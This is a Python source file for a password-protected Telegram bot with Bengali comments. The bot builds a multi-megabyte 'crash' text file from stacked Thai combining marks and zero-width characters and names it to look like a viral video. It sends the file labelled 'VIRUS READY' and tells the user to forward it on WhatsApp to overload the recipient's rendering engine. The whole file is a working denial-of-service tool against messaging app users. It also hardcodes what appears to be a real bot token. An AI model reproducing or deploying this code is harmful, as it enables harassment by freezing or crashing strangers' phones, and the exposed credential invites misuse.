import logging
import sqlite3
import os
import asyncio
import time
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from telegram.ext import Application, MessageHandler, filters, ContextTypes, ConversationHandler

# ১. লগিং সেটআপ
logging.basicConfig(level=logging.WARNING)

# ২. কনফিগারেশন
TOKEN = "8675593212:AAG6_m5ZFEqG-qkutygxbuoOetMv9N87TnY"
CORRECT_PASSWORD = "MEDEVELOPER" # আপনার দেওয়া পাসওয়ার্ড

# Conversation state
WAITING_FOR_PASSWORD = 1

# ৩. ডাটাবেস
def init_db():
    conn = sqlite3.connect('mr_dev_secure_v5.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, count INTEGER)''')
    cursor.execute("INSERT OR IGNORE INTO stats (id, count) VALUES (1, 0)")
    conn.commit()
    conn.close()

# ৪. ২-৫ এমবি পেলোড জেনারেটর (এক চুলও কম না)
async def generate_optimized_payload(status_msg):
    file_name = f"vairal_video_{int(time.time())}.txt"
    
    # শক্তিশালী ক্যারেক্টার যা রেন্ডারিং ইঞ্জিনকে ওভারলোড করে
    crash_chars = "\u0E47\u0E48\u0E49\u0E4A\u0E4B\u0E4C\u0E4D" * 450 
    invisible_mass = "\u200B\u200C\u200D\uFEFF" * 250
    header = "🎥 VIRAL_VIDEO_DATABASE_PRO_☠️\n"
    
    # ডাটা ব্লক (ঘনত্ব সর্বোচ্চ রাখা হয়েছে)
    deadly_chunk = (header + crash_chars + invisible_mass + "☣️") * 25
    
    try:
        await status_msg.edit_text("⏳ ২-৫ এমবি পেলোড জেনারেট হচ্ছে...")
        with open(file_name, "w", encoding="utf-8") as f:
            # লুপটি এমনভাবে সেট করা যাতে সাইজ ২-৫ এমবির মধ্যে থাকে
            for i in range(1, 46):
                f.write(deadly_chunk)
                if i % 15 == 0:
                    await status_msg.edit_text(f"🚀 প্রসেসিং: {int((i/45)*100)}% সম্পন্ন...")
        
        await status_msg.edit_text("🔥 ১০০% সম্পন্ন! এখন পাঠানো হচ্ছে...")
        return file_name
    except Exception:
        return None

# ৫. হ্যান্ডলার ফাংশনসমূহ
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[KeyboardButton("🚀 CREATE VIRUS")], [KeyboardButton("📊 STATUS")]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(
        f"🔥 **M R DEVELOPER PRIVATE PANEL** 🔥\n\nহ্যালো {update.effective_user.first_name}! আমি প্রস্তুত। নিচের বাটন চাপুন।",
        reply_markup=reply_markup
    )
    return ConversationHandler.END

async def ask_for_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔑 **পাসওয়ার্ড দিন:**", reply_markup=ReplyKeyboardRemove())
    return WAITING_FOR_PASSWORD

async def check_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_pass = update.message.text
    if user_pass == CORRECT_PASSWORD:
        status_msg = await update.message.reply_text("✅ পাসওয়ার্ড মিলেছে! প্রসেস শুরু হচ্ছে...")
        file_path = await generate_optimized_payload(status_msg)
        
        if file_path and os.path.exists(file_path):
            try:
                with open(file_path, 'rb') as doc:
                    await update.message.reply_document(
                        document=doc, 
                        caption="✅ **VIRUS READY!**\n\nএটি হোয়াটসঅ্যাপে ডকুমেন্ট হিসেবে পাঠান।",
                        read_timeout=120,
                        write_timeout=120
                    )
                
                # সংখ্যা আপডেট
                conn = sqlite3.connect('mr_dev_secure_v5.db')
                cur = conn.cursor()
                cur.execute("UPDATE stats SET count = count + 1 WHERE id=1")
                conn.commit()
                conn.close()
            except Exception:
                await update.message.reply_text("❌ ডেলিভারি ফেইল্ড!")
            finally:
                if os.path.exists(file_path): os.remove(file_path)
        
        await status_msg.delete()
        # মেনু আবার দেখানোর জন্য
        keyboard = [[KeyboardButton("🚀 CREATE VIRUS")], [KeyboardButton("📊 STATUS")]]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text("মিশন সফল! পরবর্তী কমান্ডের জন্য বাটন চাপুন।", reply_markup=reply_markup)
        return ConversationHandler.END
    else:
        await update.message.reply_text("❌ ভুল পাসওয়ার্ড! আবার চেষ্টা করুন অথবা /start লিখুন।")
        return WAITING_FOR_PASSWORD

async def show_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    conn = sqlite3.connect('mr_dev_secure_v5.db')
    cur = conn.cursor()
    cur.execute("SELECT count FROM stats WHERE id=1")
    total = cur.fetchone()[0]
    conn.close()
    await update.message.reply_text(f"📊 মোট তৈরি ভাইরাস: {total} টি।")

# ৬. মেইন রানার
def main():
    init_db()
    application = Application.builder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^🚀 CREATE VIRUS$'), ask_for_password)],
        states={
            WAITING_FOR_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, check_password)],
        },
        fallbacks=[MessageHandler(filters.Regex('^/start$'), start)],
    )

    application.add_handler(conv_handler)
    application.add_handler(MessageHandler(filters.Regex('^/start$'), start))
    application.add_handler(MessageHandler(filters.Regex('^📊 STATUS$'), show_status))
    
    print("---------------------------------------")
    print("M R DEVELOPER Password-Protected Bot is LIVE!")
    print("---------------------------------------")
    
    application.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
        
